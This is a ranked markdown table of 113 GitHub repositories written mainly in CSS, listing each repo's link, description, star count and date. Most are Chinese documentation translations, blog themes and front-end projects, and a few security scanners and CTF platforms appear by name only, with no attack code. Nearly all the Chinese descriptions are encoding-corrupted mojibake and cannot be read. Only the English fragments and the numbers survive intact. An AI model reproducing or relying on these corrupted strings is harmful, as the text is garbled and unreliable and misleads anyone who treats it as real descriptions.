|1|[houshanren/hangzhou_house_knowledge](https://github.com/houshanren/hangzhou_house_knowledge)|2017Âπ¥‰π∞ÊàøÁªèÂéÜÊÄªÁªìÂá∫Êù•ÁöÑ‰π∞ÊàøË¥≠ÊàøÁü•ËØÜÂàÜ‰∫´ÁªôÂ§ßÂÆ∂ÔºåÂ∏åÊúõÂØπÂ§ßÂÆ∂ÊúâÊâÄÂ∏ÆÂä©„ÄÇ‰π∞Êàø‰∏çÊòìÔºå‰∏î‰π∞‰∏îÁèçÊÉú„ÄÇSharing the knowledge of buy an own house that according  to the experience at hangzhou in 2017 to all the people. It's not easy to buy a own house, so I hope that it would be useful to everyone.|24.5k|CSS|10/18|
|2|[SwiftGGTeam/the-swift-programming-language-in-chinese](https://github.com/SwiftGGTeam/the-swift-programming-language-in-chinese)|‰∏≠ÊñáÁâà Apple ÂÆòÊñπ Swift ÊïôÁ®ã„ÄäThe Swift Programming Language„Äã|19.8k|CSS|10/25|
|3|[apachecn/algo-zh](https://github.com/apachecn/algo-zh)|ÁªìÊûÑÂåñÁÆóÊ≥ïÂà∑È¢òËÆ≠ÁªÉÊåáÂçó|10.1k|CSS|10/06|
|4|[getgridea/gridea](https://github.com/getgridea/gridea)|‚úçÔ∏èA static blog writing client (‰∏Ä‰∏™ÈùôÊÄÅÂçöÂÆ¢ÂÜô‰ΩúÂÆ¢Êà∑Á´Ø)|6.5k|CSS|09/08|
|5|[deeplearning-ai/machine-learning-yearning-cn](https://github.com/deeplearning-ai/machine-learning-yearning-cn)|Machine Learning Yearning ‰∏≠ÊñáÁâà - „ÄäÊú∫Âô®Â≠¶‰π†ËÆ≠ÁªÉÁßòÁ±ç„Äã - Andrew Ng Ëëó|6.4k|CSS|04/05|
|6|[xtyxtyx/sorry](https://github.com/xtyxtyx/sorry)|Âú®Á∫øÂà∂‰Ωú`sorry ‰∏∫ÊâÄÊ¨≤‰∏∫`ÁöÑgif|6.1k|CSS|04/03|
|7|[DMQ/mvvm](https://github.com/DMQ/mvvm)|ÂâñÊûêvueÂÆûÁé∞ÂéüÁêÜÔºåËá™Â∑±Âä®ÊâãÂÆûÁé∞mvvm|4.7k|CSS|09/16|
|8|[apachecn/sklearn-doc-zh](https://github.com/apachecn/sklearn-doc-zh)|:book: [ËØë] scikit-learnÔºàsklearnÔºâ ‰∏≠ÊñáÊñáÊ°£|3.9k|CSS|10/23|
|9|[Wei-Xia/most-frequent-technology-english-words](https://github.com/Wei-Xia/most-frequent-technology-english-words)|Á®ãÂ∫èÂëòÂ∑•‰Ωú‰∏≠Â∏∏ËßÅÁöÑËã±ËØ≠ËØçÊ±á|3.4k|CSS|10/22|
|10|[LearnOpenGL-CN/LearnOpenGL-CN](https://github.com/LearnOpenGL-CN/LearnOpenGL-CN)|http://learnopengl.com Á≥ªÂàóÊïôÁ®ãÁöÑÁÆÄ‰Ωì‰∏≠ÊñáÁøªËØë|2.8k|CSS|09/12|
|11|[yscoder/hexo-theme-indigo](https://github.com/yscoder/hexo-theme-indigo)|‰∏Ä‰∏™Material DesignÈ£éÊ†ºÁöÑHexo‰∏ªÈ¢ò„ÄÇ https://imys.net/ „ÄÄ„ÄÄ Â§áÁî®:|2.7k|CSS|07/24|
|12|[apachecn/pytorch-doc-zh](https://github.com/apachecn/pytorch-doc-zh)|Pytorch ‰∏≠ÊñáÊñáÊ°£|2.7k|CSS|10/22|
|13|[ronggang/transmission-web-control](https://github.com/ronggang/transmission-web-control)|‰∏Ä‰∏™ Transmission ÊµèËßàÂô®ÁÆ°ÁêÜÁïåÈù¢„ÄÇTransmission Web Control is a custom web UI.|2.6k|CSS|10/05|
|14|[billie66/TLCL](https://github.com/billie66/TLCL)|„ÄäÂø´‰πêÁöÑ Linux ÂëΩ‰ª§Ë°å„Äã|2.5k|CSS|10/04|
|15|[LiangJunrong/document-library](https://github.com/LiangJunrong/document-library)|jsliang ÁöÑÊñáÊ°£Â∫ì. ÈáåÈù¢ÂåÖÂê´‰∫Ü‰∏™‰∫∫Êí∞ÂÜôÁöÑÊâÄÊúâÂâçÁ´ØÊñáÁ´†Ôºå‰æãÂ¶Ç Vue„ÄÅReact,„ÄÅECharts„ÄÅÂæÆ‰ø°Â∞èÁ®ãÂ∫è„ÄÅÁÆóÊ≥ï„ÄÅÊï∞ÊçÆÁªìÊûÑÁ≠â‚Ä¶‚Ä¶|2.3k|CSS|10/29|
|16|[zmrenwu/django-blog-tutorial](https://github.com/zmrenwu/django-blog-tutorial)|Âü∫‰∫é Python3.5 Âíå Django 1.10 ÁöÑ Django Blog È°πÁõÆ„ÄÇ|2.1k|CSS|06/06|
|17|[apachecn/fe4ml-zh](https://github.com/apachecn/fe4ml-zh)|:book: [ËØë] Èù¢ÂêëÊú∫Âô®Â≠¶‰π†ÁöÑÁâπÂæÅÂ∑•Á®ã|2.1k|CSS|10/06|
|18|[QiShaoXuan/css_tricks](https://github.com/QiShaoXuan/css_tricks)|Some CSS tricks,‰∏Ä‰∫õ CSS Â∏∏Áî®Ê†∑Âºè|2.1k|CSS|06/17|
|19|[WebStackPage/WebStackPage.github.io](https://github.com/WebStackPage/WebStackPage.github.io)|‚ù§Ô∏èÈùôÊÄÅÂìçÂ∫îÂºèÁΩëÂùÄÂØºËà™ÁΩëÁ´ô - webstack.cc|2.0k|CSS|09/24|
|20|[FunctionClub/V2ray.Fun](https://github.com/FunctionClub/V2ray.Fun)|Ê≠£Âú®ÂºÄÂèëÁöÑÂÖ®Êñ∞ V2ray.Fun|2.0k|CSS|10/28|
|21|[apachecn/mit-18.06-linalg-notes](https://github.com/apachecn/mit-18.06-linalg-notes)|MIT 18.06 Á∫øÊÄß‰ª£Êï∞Á¨îËÆ∞|1.5k|CSS|10/07|
|22|[wizardforcel/sicp-py-zh](https://github.com/wizardforcel/sicp-py-zh)|:book:„ÄêËØë„ÄëUCB CS61a SICP Python|1.4k|CSS|08/17|
|23|[nicejade/markdown-online-editor](https://github.com/nicejade/markdown-online-editor)|üìùÂü∫‰∫é Vue„ÄÅVditorÔºåÊâÄÊûÑÂª∫ÁöÑÂú®Á∫ø Markdown ÁºñËæëÂô®ÔºåÊîØÊåÅÊµÅÁ®ãÂõæ„ÄÅÁîòÁâπÂõæ„ÄÅÊó∂Â∫èÂõæ„ÄÅ‰ªªÂä°ÂàóË°®„ÄÅHTML Ëá™Âä®ËΩ¨Êç¢‰∏∫ Markdown Á≠âÂäüËÉΩÔºõüéâÊñ∞Â¢û„ÄåÊâÄËßÅÂç≥ÊâÄÂæó„ÄçÁºñËæëÊ®°Âºè„ÄÇ|1.2k|CSS|10/09|
|24|[apachecn/home](https://github.com/apachecn/home)|ApacheCN  ÂºÄÊ∫êÁªÑÁªáÔºöÂÖ¨Âëä„ÄÅ‰ªãÁªç„ÄÅÊàêÂëò„ÄÅÊ¥ªÂä®„ÄÅ‰∫§ÊµÅÊñπÂºè|1.2k|CSS|10/29|
|25|[abc-club/js-paradise](https://github.com/abc-club/js-paradise)|ÂâçÁ´Ø‰πêÂõ≠|1.1k|CSS|10/28|
|26|[apachecn/spark-doc-zh](https://github.com/apachecn/spark-doc-zh)|Apache Spark ÂÆòÊñπÊñáÊ°£‰∏≠ÊñáÁâà|1.1k|CSS|10/06|
|27|[beeth0ven/RxSwift-Chinese-Documentation](https://github.com/beeth0ven/RxSwift-Chinese-Documentation)|RxSwift ‰∏≠ÊñáÊñáÊ°£|1.0k|CSS|09/18|
|28|[egotong/nows](https://github.com/egotong/nows)|ÊØíÈ∏°Ê±§|1.0k|CSS|07/05|
|29|[yihui/xaringan](https://github.com/yihui/xaringan)|Presentation Ninja ÂπªÁÅØÂøçËÄÖ ¬∑ ÂÜôËΩÆÁúº|1.0k|CSS|10/26|
|30|[leopardpan/leopardpan.github.io](https://github.com/leopardpan/leopardpan.github.io)|‰∏™‰∫∫ÂçöÂÆ¢ÔºåÁúãÊïàÊûúËøõÂÖ•|1.0k|CSS|07/13|
|31|[shenliyang/hexo-theme-snippet](https://github.com/shenliyang/hexo-theme-snippet)|Snippet ÁÆÄÊ¥ÅËÄå‰∏çÁÆÄÂçïÔºå‰πüËÆ∏ÊòØ‰∏ÄÊ¨æ‰Ω†ÂØªÊâæÂ∑≤‰πÖÁöÑhexo‰∏ªÈ¢ò|968|CSS|04/07|
|32|[smartping/smartping](https://github.com/smartping/smartping)|ÁªºÂêàÊÄßÁΩëÁªúË¥®Èáè(PING)Ê£ÄÊµãÂ∑•ÂÖ∑ÔºåÊîØÊåÅÊ≠£/ÂèçÂêëPINGÁªòÂõæ„ÄÅ‰∫íPINGÊãìÊâëÁªòÂõæ‰∏éÊä•Ë≠¶„ÄÅÂÖ®ÂõΩPINGÂª∂ËøüÂú∞Âõæ‰∏éÂú®Á∫øÊ£ÄÊµãÂ∑•ÂÖ∑Á≠âÂäüËÉΩ |955|CSS|10/05|
|33|[cnfeat/GoodThingList](https://github.com/cnfeat/GoodThingList)|GoodThingList Â∞±ÊòØÂ•ΩÁâ©Ê∏ÖÂçïÔºå‰ΩøÁî®ÊñáÊ°£ËßÅ Issues|931|CSS|03/11|
|34|[w-digital-scanner/w12scan](https://github.com/w-digital-scanner/w12scan)|üöÄ A simple asset discovery engine for cybersecurity. (ÁΩëÁªúËµÑ‰∫ßÂèëÁé∞ÂºïÊìé)|895|CSS|04/26|
|35|[kaeyleo/jekyll-theme-H2O](https://github.com/kaeyleo/jekyll-theme-H2O)| üéâ A clean and delicate Jekyll theme. JekyllÂçöÂÆ¢‰∏ªÈ¢ò|882|CSS|04/18|
|36|[h5ds/h5ds](https://github.com/h5ds/h5ds)|H5DS (HTML5 Design software) ËøôÊòØ‰∏ÄÊ¨æÂü∫‰∫éWEBÁöÑ H5Âà∂‰ΩúÂ∑•ÂÖ∑„ÄÇËÆ©‰∏ç‰ºöÂÜô‰ª£Á†ÅÁöÑ‰∫∫‰πüËÉΩËΩªÊùæÂø´ÈÄü‰∏äÊâãÂà∂‰ΩúH5È°µÈù¢„ÄÇÁ±ª‰ººÊòì‰ºÅÁßÄÁöÑH5Âà∂‰Ωú„ÄÅÂª∫Á´ôÂ∑•ÂÖ∑ÔºåÁ§∫ËåÉÁΩëÁ´ôÔºöh5ds.com |879|CSS|07/09|
|37|[xuqiang521/nuxt-ssr-demo](https://github.com/xuqiang521/nuxt-ssr-demo)|:sparkles:  È´ò‰ªøÊéòÈáëÔºåÊï¥Âêà vue + nuxt + axios + vuex + vue-router (nuxt Ëá™Â∏¶ vuex Âíå vue-router)Ôºå‰∏Ä‰∏™Âü∫‰∫é Nuxt ÁöÑÊúçÂä°Âô®Á´ØÊ∏≤Êüì Demo|813|CSS|09/11|
|38|[apachecn/pyda-2e-zh](https://github.com/apachecn/pyda-2e-zh)|:book:  [ËØë] Âà©Áî® Python ËøõË°åÊï∞ÊçÆÂàÜÊûê ¬∑ Á¨¨ 2 Áâà|789|CSS|10/06|
|39|[longfeizheng/logback](https://github.com/longfeizheng/logback)|üí° SpringBoot+Spring SecurityÂü∫Êú¨ÈÖçÁΩÆ|758|CSS|06/11|
|40|[YGYOOO/WeChat-Shelter](https://github.com/YGYOOO/WeChat-Shelter)|chromeÊèí‰ª∂ÔºåÊääÁΩëÈ°µÂæÆ‰ø°‰º™Ë£ÖÊàê‰∫ëÁ¨îËÆ∞~Ôºà‰ªÖ‰æõÂ®±‰πê! (Ôø£ŒµÔø£) |707|CSS|04/30|
|41|[apachecn/lightgbm-doc-zh](https://github.com/apachecn/lightgbm-doc-zh)|LightGBM ‰∏≠ÊñáÊñáÊ°£|661|CSS|10/06|
|42|[theme-nexmoe/hexo-theme-nexmoe](https://github.com/theme-nexmoe/hexo-theme-nexmoe)|üî• ‰∏Ä‰∏™ÊØîËæÉÁâπÂà´ÁöÑ Hexo ‰∏ªÈ¢ò|647|CSS|10/25|
|43|[e282486518/yii2admin](https://github.com/e282486518/yii2admin)|ÈÄöÁî®ÁöÑyii2ÂêéÂè∞ÔºåÂü∫‰∫éYii2ÁöÑadvancedÂ∫îÁî®Á®ãÂ∫èÊ®°ÊùøÔºåÊï¥ÂêàRBAC„ÄÅMenu„ÄÅConfig„ÄÅMigrationÂ§öËØ≠Ë®Ä„ÄÅRESTfullÁ≠âÁ≠â...|613|CSS|05/25|
|44|[xiangming/landscape-plus](https://github.com/xiangming/landscape-plus)|ÈíàÂØπ‰∏≠ÂõΩÂ§ßÈôÜÂú∞Âå∫ÂØπhexoÂÆòÊñπ‰∏ªÈ¢òlandscapeËøõË°å‰ºòÂåñ„ÄÇ|502|CSS|02/20|
|45|[AlanDecode/Typecho-Theme-VOID](https://github.com/AlanDecode/Typecho-Theme-VOID)|üêí Áå¥Â≠êÊâìÂ≠óÊú∫ÂéüÁêÜÁöÑ‰∫ßÁâ©|496|CSS|07/30|
|46|[blinkfox/typora-vue-theme](https://github.com/blinkfox/typora-vue-theme)|This is a typora theme inspired by Vue document style. ‰∏Ä‰∏™Á±ª‰ºº‰∫é Vue ÊñáÊ°£È£éÊ†ºÁöÑ Typora Markdown ÁºñËæëÂô®‰∏ªÈ¢ò„ÄÇ|490|CSS|10/15|
|47|[apachecn/xgboost-doc-zh](https://github.com/apachecn/xgboost-doc-zh)|XGBoost ‰∏≠ÊñáÊñáÊ°£|485|CSS|10/06|
|48|[ownthink/robot](https://github.com/ownthink/robot)|Áü•ËØÜÂõæË∞±ÈóÆÁ≠îÊú∫Âô®‰∫∫ÔºåËÅäÂ§©Êú∫Âô®‰∫∫ÔºåÂü∫‰∫éÁü•ËØÜÂõæË∞±„ÄÅËØ≠‰πâÁêÜËß£Á≠âÁöÑÂØπËØùÊú∫Âô®‰∫∫„ÄÇ|478|CSS|10/21|
|49|[ant-mini-program/mini-antui](https://github.com/ant-mini-program/mini-antui)|mini-antui ÂÅúÊ≠¢Áª¥Êä§ÔºåÂèØ‰ΩøÁî® mini-ali-ui ÔºåÂìÅÁâåÂçáÁ∫ßÔºåÂäüËÉΩÂä†Âº∫ÔºåÊ¨¢Ëøé‰ΩøÁî®ÔºÅ|450|CSS|03/02|
|50|[v2fly/v2ray-examples](https://github.com/v2fly/v2ray-examples)|v2ray-core ÁöÑÊ®°Êùø‰ª¨|447|CSS|10/25|
|51|[byrwiki/byrwiki](https://github.com/byrwiki/byrwiki)|ÂåóÈÇÆ‰∫∫ÂØºËà™Ôºö‰∏Ä‰∏™Ê°ÜÔºåÂÖ®ËÉΩÊêú|444|CSS|06/18|
|52|[d2-projects/folder-explorer](https://github.com/d2-projects/folder-explorer)|ÂàÜÊûêÊñá‰ª∂ÁõÆÂΩïÔºåÁªüËÆ°Êï∞ÊçÆÂπ∂‰ª•Ê†ëÂΩ¢ÁªìÊûÑÂíåÂõæË°®ÁöÑÂΩ¢ÂºèÂ±ïÁ§∫ÁªìÊûúÔºå‰πüÂèØ‰ª•ÂØºÂá∫Â§öÁßçÊ†ºÂºèÁïôÂ≠ò|430|CSS|09/12|
|53|[Dreamer-Paul/Single](https://github.com/Dreamer-Paul/Single)|üéà ‰∏Ä‰∏™ÁÆÄÊ¥ÅÂ§ßÊ∞îÔºåÂê´Â§úÈó¥Ê®°ÂºèÁöÑ Typecho ÂçöÂÆ¢‰∏ªÈ¢ò|417|CSS|09/11|
|54|[fex-team/fex-team.github.io](https://github.com/fex-team/fex-team.github.io)|ÂÅöÊúÄ‰∏ì‰∏öÁöÑÂâçÁ´ØÂõ¢Èòü|397|CSS|06/19|
|55|[nodejs/nodejs-zh-CN](https://github.com/nodejs/nodejs-zh-CN)|node.js ‰∏≠ÊñáÂåñ & ‰∏≠ÊñáÁ§æÂå∫|393|CSS|07/11|
|56|[ltadpoles/web-document](https://github.com/ltadpoles/web-document)|ÂâçÁ´ØÂéÜÁ®ã|387|CSS|08/28|
|57|[xmxoxo/BERT-train2deploy](https://github.com/xmxoxo/BERT-train2deploy)|BERTÊ®°Âûã‰ªéËÆ≠ÁªÉÂà∞ÈÉ®ÁΩ≤|387|CSS|09/23|
|58|[wepyjs/wepy-weui-demo](https://github.com/wepyjs/wepy-weui-demo)|WeUI Âú® WePY ‰∏≠ÁöÑ‰ΩøÁî®Á§∫‰æãÔºåÂêå‰∏Ä‰ªΩ‰ª£Á†ÅÂèØ‰ª•ËøêË°åÂú®Â∞èÁ®ãÂ∫è‰∏äÂíåWeb‰∏ä|387|CSS|10/02|
|59|[zlq4863947/tradingViewWikiCn](https://github.com/zlq4863947/tradingViewWikiCn)|tradingViewÁöÑ‰∏≠ÊñáÂºÄÂèëÊñáÊ°£|385|CSS|10/06|
|60|[dongyuanxin/theme-bmw](https://github.com/dongyuanxin/theme-bmw)|‚úã Smart Voice: Voice for yourself   ÂæÆÂ£∞: ËØ∑‰∏∫Ëá™Â∑±ÂèëÂ£∞|375|CSS|02/19|
|61|[DT27/EditorMD](https://github.com/DT27/EditorMD)|Markdown ÁºñËæëÂô® Editor.md for Typecho|367|CSS|05/06|
|62|[zhangyingwei/html-css-only](https://github.com/zhangyingwei/html-css-only)|ÊºÇ‰∫ÆÁöÑ CSS Á≥ªÂàó~|351|CSS|07/12|
|63|[apachecn/thinking-in-java-zh](https://github.com/apachecn/thinking-in-java-zh)|:book: Java ÁºñÁ®ãÊÄùÊÉ≥|351|CSS|09/17|
|64|[apachecn/ml-mastery-zh](https://github.com/apachecn/ml-mastery-zh)|:book: [ËØë] MachineLearningMastery ÂçöÂÆ¢ÊñáÁ´†|349|CSS|10/06|
|65|[w-digital-scanner/w11scan](https://github.com/w-digital-scanner/w11scan)|ÂàÜÂ∏ÉÂºèWEBÊåáÁ∫πËØÜÂà´Âπ≥Âè∞ Distributed WEB fingerprint identification platform|341|CSS|06/06|
|66|[7dog7/bottleneckOsmosis](https://github.com/7dog7/bottleneckOsmosis)|Áì∂È¢àÊ∏óÈÄè,webÊ∏óÈÄè,redÁ∫¢Èòü,fuzz param,Ê≥®Èáä,jsÂ≠óÂÖ∏,ctf|337|CSS|09/06|
|67|[jhao104/django-blog](https://github.com/jhao104/django-blog)|djangoÊê≠Âª∫ÂçöÂÆ¢|336|CSS|10/29|
|68|[Jackwire/Jackwire.github.io](https://github.com/Jackwire/Jackwire.github.io)|ÊâòÁ¶èÈõÖÊÄùGREÂíåGMATËµÑÊñôÔºåÁî≥ËØ∑Êñá‰π¶ÈõÜÂêà„ÄÇÂ≠òÂú®ÁôæÂ∫¶ÁΩëÁõòÈáå|324|CSS|05/03|
|69|[codeset/google-java-styleguide](https://github.com/codeset/google-java-styleguide)|Google Java‰ª£Á†ÅÈ£éÊ†ºËßÑËåÉ (‰∏≠ÊñáÁâà)|320|CSS|10/13|
|70|[xupsh/pp4fpgas-cn](https://github.com/xupsh/pp4fpgas-cn)|‰∏≠ÊñáÁâà Parallel Programming for FPGAs|313|CSS|10/30|
|71|[Daotin/Web](https://github.com/Daotin/Web)|üìöüñä ÂºÄÂßãÂêßÔºåÂâçÁ´ØÔºÅ‰ªéÈõ∂ÂºÄÂßãÂ≠¶ Web ÂâçÁ´ØÁ≥ªÂàóÊïôÁ®ã„ÄÇÂâçÁ´ØÂ∞èÁôΩÈõ∂Âü∫Á°ÄËá™Â≠¶ÂÖ•Èó®ËøõÈò∂ÂõæÊñáÊïôÁ®ã„ÄÇ|280|CSS|10/15|
|72|[ustc-zzzz/YiGeDingLia](https://github.com/ustc-zzzz/YiGeDingLia)|‰∏Ä‰∏™È°∂‰ø©|269|CSS|09/10|
|73|[EastWorld/wechat-app-order](https://github.com/EastWorld/wechat-app-order)|ÁÇπÈ§êÂ∞èÁ®ãÂ∫èÔºåÁÇπÂçïËá™Âä®Âá∫ÂçïÔºåÁÇπÈ§êËá™Âä®ÊâìÂç∞|263|CSS|07/27|
|74|[nyahentai/nyahentai.github.io](https://github.com/nyahentai/nyahentai.github.io)|NyaHentaiÂñµÁ¥≥Â£´ÊúÄÊñ∞Á∂≤ÂùÄÁôºÂ∏ÉÈ†Å|263|CSS|10/27|
|75|[mengkunsoft/lmbtfy](https://github.com/mengkunsoft/lmbtfy)|üîç ËÆ©ÊàëÂ∏Æ‰Ω†ÁôæÂ∫¶‰∏Ä‰∏ãÔºüLet Me Baidu That For You|262|CSS|09/05|
|76|[FromEndWorld/LOFFER](https://github.com/FromEndWorld/LOFFER)|ÂçöÂÆ¢‰∏ªÈ¢ò A Jekyll theme with Chinese UI and document |257|CSS|09/04|
|77|[apachecn/stanford-cs224n-notes-zh](https://github.com/apachecn/stanford-cs224n-notes-zh)|:book: ÊñØÂù¶Á¶è CS224n Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ‰∏≠ÊñáÁ¨îËÆ∞|255|CSS|09/17|
|78|[c10342/player](https://github.com/c10342/player)|electron-vueÈü≥ËßÜÈ¢ëÊí≠ÊîæÂô®|252|CSS|09/07|
|79|[justjavac/esnext](https://github.com/justjavac/esnext)|‰ªãÁªçÊúÄÊñ∞ÁöÑ ECMAScript/JavaScript ËßÑËåÉÔºå‰ª•Âèä TC39 ÁöÑÊèêÊ°àËøõÂ∫¶|249|CSS|03/23|
|80|[zgq354/typecho-theme-next](https://github.com/zgq354/typecho-theme-next)|Hexo ‰∏ªÈ¢ò NexT.Mist ÁöÑ Typecho ÁßªÊ§çÁâàÔºàÈáçÊûÑ‰∏≠Ôºâ|248|CSS|03/09|
|81|[fofapro/fofa_view](https://github.com/fofapro/fofa_view)|FOFA Pro view ÊòØ‰∏ÄÊ¨æFOFA Pro ËµÑ‰∫ßÂ±ïÁ§∫ÊµèËßàÂô®Êèí‰ª∂ÔºåÁõÆÂâçÂÖºÂÆπ  Chrome„ÄÅFirefox„ÄÅOpera„ÄÇ|246|CSS|07/18|
|82|[hellosee/swoole-webim-demo](https://github.com/hellosee/swoole-webim-demo)|‰ΩøÁî®swooleÊâ©Â±ïÂíåphpÂºÄÂèëÁöÑ‰∏Ä‰∏™Âú®Á∫øËÅäÂ§©ÂÆ§(Making a Web Chat With PHP and Swoole)|243|CSS|02/12|
|83|[LF112/BTCO](https://github.com/LF112/BTCO)|üéâ ÂÆùÂ°îÈù¢ÊùøÂìçÂ∫îÂºèËß£ÂÜ≥ÊñπÊ°à|239|CSS|09/12|
|84|[dotnetclub-net/dotnetclub](https://github.com/dotnetclub-net/dotnetclub)|dotnetclub.net ÁöÑÊ∫ê‰ª£Á†Å|236|CSS|09/09|
|85|[trinitrotofu/Bubble](https://github.com/trinitrotofu/Bubble)|Typecho Ê∏ÖÊñ∞È£éÊ†ºÂìçÂ∫îÂºè‰∏ªÈ¢ò|228|CSS|10/29|
|86|[HongqingCao/vue-portal-webUI](https://github.com/HongqingCao/vue-portal-webUI)|Âü∫‰∫éVueÁöÑÈó®Êà∑ÁΩëÁ´ôÂ∞èÁªÑ‰ª∂|228|CSS|09/04|
|87|[xfgryujk/blivechat](https://github.com/xfgryujk/blivechat)|Áî®‰∫éOBSÁöÑ‰ªøYouTubeÈ£éÊ†ºÁöÑbilibiliÁõ¥Êí≠ËØÑËÆ∫Ê†è|224|CSS|10/17|
|88|[happypeter/haoduoshipin](https://github.com/happypeter/haoduoshipin)|Â•ΩÂ§öËßÜÈ¢ë|216|CSS|08/24|
|89|[apachecn/ntu-hsuantienlin-ml](https://github.com/apachecn/ntu-hsuantienlin-ml)|:book: Âè∞ÊπæÂ§ßÂ≠¶ÊûóËΩ©Áî∞Êú∫Âô®Â≠¶‰π†Á¨îËÆ∞|214|CSS|10/06|
|90|[apachecn/flink-doc-zh](https://github.com/apachecn/flink-doc-zh)|Apache Flink ‰∏≠ÊñáÊñáÊ°£|211|CSS|10/06|
|91|[twotreesus/V2ray.FunPi](https://github.com/twotreesus/V2ray.FunPi)|‰∏Ä‰∏™Âü∫‰∫é Web ÁöÑ V2ray ÊéßÂà∂Èù¢ÊùøÔºåÂ∑≤ÊîπÈÄ†‰∏∫Â∞ÜÊ†ëËéìÊ¥æ‰Ωú‰∏∫ÊóÅË∑ØÁî±‰ΩøÁî®ÔºåÂè™ÈúÄË¶ÅËÆæÁΩÆÂ•ΩÁΩëÂÖ≥ÔºåÂç≥ÂèØ‰ª£ÁêÜË∑ØÁî±Âô®‰∏ãÊâÄÊúâËÆæÂ§áÈÄèÊòéÁøªÂ¢ôÔºåÊîØÊåÅÁõ¥Ëøû\Êô∫ËÉΩÂàÜÊµÅ\ÂÖ®Â±Ä‰ª£ÁêÜ ‰∏âÁßçÊ®°ÂºèÔºåÂπ∂ËÉΩËá™Âä®ÁÆ°ÁêÜËÆ¢ÈòÖÔºåÂéüÁêÜÂèÇËÄÉ [ÈÄèÊòé‰ª£ÁêÜ(TPROXY)|209|CSS|10/28|
|92|[livelyPeng/pl-drag-template](https://github.com/livelyPeng/pl-drag-template)|‰∏Ä‰∏™h5ÂèØËßÜÂåñÁºñËæëÂô®È°πÁõÆ|209|CSS|09/11|
|93|[apachecn/opencv-doc-zh](https://github.com/apachecn/opencv-doc-zh)|:book: [ËØë] OpenCV ‰∏≠ÊñáÊñáÊ°£|208|CSS|10/06|
|94|[sanjinhub/hexo-theme-geek](https://github.com/sanjinhub/hexo-theme-geek)|‰∏Ä‰∏™Á¨¶ÂêàÊûÅÂÆ¢Á≤æÁ•û‰∏ª‰πâÊûÅÁÆÄÁöÑ Hexo ‰∏ªÈ¢ò|206|CSS|04/21|
|95|[kali-docs-cn/kali-linux-cookbook-zh](https://github.com/kali-docs-cn/kali-linux-cookbook-zh)|:book: „ÄêËØë„ÄëKali Linux ÁßòÁ±ç|201|CSS|10/01|
|96|[mo-xiaoxi/AWD_CTF_Platform](https://github.com/mo-xiaoxi/AWD_CTF_Platform)|‰∏Ä‰∏™ÁÆÄÂçïÁöÑAWDËÆ≠ÁªÉÂπ≥Âè∞|199|CSS|10/13|
|97|[Zisbusy/Akina-for-Typecho](https://github.com/Zisbusy/Akina-for-Typecho)|Akina for Typecho ‰∏ªÈ¢òÊ®°Êùø|199|CSS|09/09|
|98|[medcl/book-elastic-search-in-action](https://github.com/medcl/book-elastic-search-in-action)|Elastic ÊêúÁ¥¢ÂºÄÂèëÂÆûÊàò|195|CSS|07/10|
|99|[xukimseven/HardCandy-Jekyll](https://github.com/xukimseven/HardCandy-Jekyll)|‰∏ÄÊ¨æÊ∏ÖÊñ∞ Á≥ñÊûúËâ≤üç¨ ÁöÑ ‚ÄòJekyll‚Äô ‰∏ªÈ¢ò„ÄÇA candy-colored üç¨ ‚ÄòJekyll‚Äô theme.|194|CSS|06/01|
|100|[mashirozx/arknights-ui](https://github.com/mashirozx/arknights-ui)|H5 Â§çÂàªÁâàÊòéÊó•ÊñπËàüÊ∏∏Êàè‰∏ªÁïåÈù¢|191|CSS|05/06|
|101|[eagleoflqj/p1a3_script](https://github.com/eagleoflqj/p1a3_script)|Tampermonkey Script for 1point3acres / ‰∏Ä‰∫©‰∏âÂàÜÂú∞ÁöÑÊ≤πÁå¥ËÑöÊú¨|190|CSS|06/19|
|102|[xinggsf/Adblock-Plus-Rule](https://github.com/xinggsf/Adblock-Plus-Rule)|ABPËøáÊª§ËßÑÂàôÁÆÄÂåñÁâà|189|CSS|02/10|
|103|[hsxyhao/gridea-theme-next](https://github.com/hsxyhao/gridea-theme-next)|Gridea NexT‰∏ªÈ¢òÔºåÊê¨hexo-next-theme|189|CSS|09/15|
|104|[szpnygo/wepy_ios_top](https://github.com/szpnygo/wepy_ios_top)|‰∏ÄÊ¨æÂèØ‰ª•ÂàáÊç¢ÂõΩÂÆ∂Êü•Áúã‰∏çÂêåÂõΩÂÆ∂iOSÂ∫îÁî®ÊéíË°åÊ¶úÁöÑÂ∞èÁ®ãÂ∫è|185|CSS|06/23|
|105|[Zou-Wang/CNblogs-Theme-Sakura](https://github.com/Zou-Wang/CNblogs-Theme-Sakura)|Âü∫‰∫éSakuraÁæéÂåñÁöÑÂçöÂÆ¢Âõ≠Ê†∑Âºè|179|CSS|07/28|
|106|[lovefc/china_school_badge](https://github.com/lovefc/china_school_badge)|ÂÖ®ÂõΩÈ´òÊ†°Ê†°ÂæΩÂ≠ó‰ΩìÂõæÊ†áÂ∫ì|173|CSS|08/19|
|107|[Lemonreds/hexo-theme-nayo](https://github.com/Lemonreds/hexo-theme-nayo)|‰∏Ä‰∏™ÁÆÄÊ¥ÅÁöÑHexo‰∏ªÈ¢ò.|172|CSS|08/31|
|108|[apachecn/matplotlib-doc-zh](https://github.com/apachecn/matplotlib-doc-zh)|:book: [ËØë] Matplotlib Áî®Êà∑ÊåáÂçó|171|CSS|10/06|
|109|[lzhpo/lzhpo-shiro](https://github.com/lzhpo/lzhpo-shiro)|ÁæéËßÇ„ÄÅÊºÇ‰∫ÆÔºåÊàëÊäΩÁ¶ªÂá∫Êù•ÁöÑÔºåÊãøÊù•Âç≥Áî®ÁöÑÁÆÄÂçïÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºÅ|169|CSS|08/23|
|110|[imsobear/blog](https://github.com/imsobear/blog)|ÊûúÂêåÂ≠¶ÁöÑÂçöÂÆ¢|161|CSS|03/04|
|111|[AxiosCros/tpr-cms](https://github.com/AxiosCros/tpr-cms)|Èù¢ÂêëÂ§öÂ∫îÁî®Ê®°ÂºèÁöÑÁÆ°ÁêÜÁ≥ªÁªüÂíåÊé•Âè£ÂºÄÂèëÊ°ÜÊû∂|156|CSS|10/21|
|112|[apachecn/hbase-doc-zh](https://github.com/apachecn/hbase-doc-zh)|:book: HBase ‰∏≠ÊñáÂèÇËÄÉÊåáÂçó|155|CSS|10/06|
|113|[apachecn/airflow-doc-zh](https://github.com/apachecn/airflow-doc-zh)|:book: [ËØë] Airflow ‰∏≠ÊñáÊñáÊ°£|155|CSS|10/07|
